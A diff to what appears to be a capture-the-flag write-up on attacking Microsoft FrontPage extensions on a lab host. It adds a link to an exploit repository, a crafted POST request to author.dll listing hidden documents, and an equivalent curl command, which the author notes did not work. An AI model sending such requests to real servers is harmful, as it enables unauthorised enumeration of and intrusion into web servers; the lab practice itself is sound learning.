@@ -122,5 +122,25 @@ the _vti_bin directory or other executable directories.  Having user read,
 write, and execute access is just one step away from having full admin access.
 ```
 
- - It looks like we need to intercept and modify HTTP requests to the server, and through some crafted POST requests we may be able to unlock access. Setting up proxy through BurpSuite...
+ - It looks like we need to intercept and modify HTTP requests to the server, and through some crafted POST requests we may be able to unlock access. This doc has some potential examples: https://github.com/deepak0401/Front-Page-Exploit
 
+```
+POST /_vti_bin/_vti_aut/author.dll HTTP/1.1
+MIME-Version: 1.0
+Accept: auth/sicily
+Content-Length: 219
+Host: 10.10.10.14
+Content-Type: application/x-www-form-urlencoded
+X-Vermeer-Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+
+method=list+documents%3a5%2e0%2e2%2e6790&service%5fname=&listHiddenDocs=true&lis
+tExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInf
+o=false&listIncludeParent=true&listDerived=false&listBorders=false
+```
+
+```shell
+curl --data "method=list+documents%3a5%2e0%2e2%2e6790&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=falselistFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerived=falselistBorders=false" -H "MIME-Version: 1.0" -H "Accept: auth/sicily" -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 219" -H "Host: 10.10.10.14" -H "X-Vermeer-Content-Type: application/x-www-form-urlencoded" -H "Connection: Keep-Alive" http://10.10.10.14/_vti_bin/_vti_aut/author.dll
+```
+
+(Didn't work)
